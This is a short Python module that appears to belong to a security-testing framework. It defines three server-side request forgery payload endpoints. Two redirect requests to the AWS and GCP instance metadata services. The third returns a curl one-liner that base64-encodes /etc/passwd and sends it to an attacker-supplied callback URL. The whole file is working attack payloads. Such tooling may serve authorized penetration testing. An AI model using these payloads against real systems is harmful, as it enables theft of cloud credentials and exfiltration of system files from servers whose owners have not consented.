"""SSRF PoC"""
from ..base import poc, PocRequest, PocResponse


@poc(
    name="ssrf-aws",
    description="SSRF AWS Metadata",
    category="ssrf",
    redirect_url="http://169.254.169.254/latest/meta-data/",
    status_code=302,
)
async def ssrf_aws(req: PocRequest) -> PocResponse:
    return PocResponse(redirect_url="http://169.254.169.254/latest/meta-data/", status_code=302)


@poc(
    name="ssrf-gcp",
    description="SSRF GCP Metadata",
    category="ssrf",
    redirect_url="http://metadata.google.internal/computeMetadata/v1/",
    status_code=302,
)
async def ssrf_gcp(req: PocRequest) -> PocResponse:
    return PocResponse(redirect_url="http://metadata.google.internal/computeMetadata/v1/", status_code=302)


@poc(
    name="ssrf-exfil",
    description="SSRF exfil curl",
    category="ssrf",
    content_type="text/plain",
    response_body="curl '{{callback_url}}?_exfil=1&_type=ssrf&_data='$(cat /etc/passwd | base64 -w0)",
    enable_variables=True,
)
async def ssrf_exfil(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = "curl " + chr(39) + cb + "?_exfil=1&_type=ssrf&_data=" + chr(39) + "$(cat /etc/passwd | base64 -w0)"
    return PocResponse(body=body, content_type="text/plain")
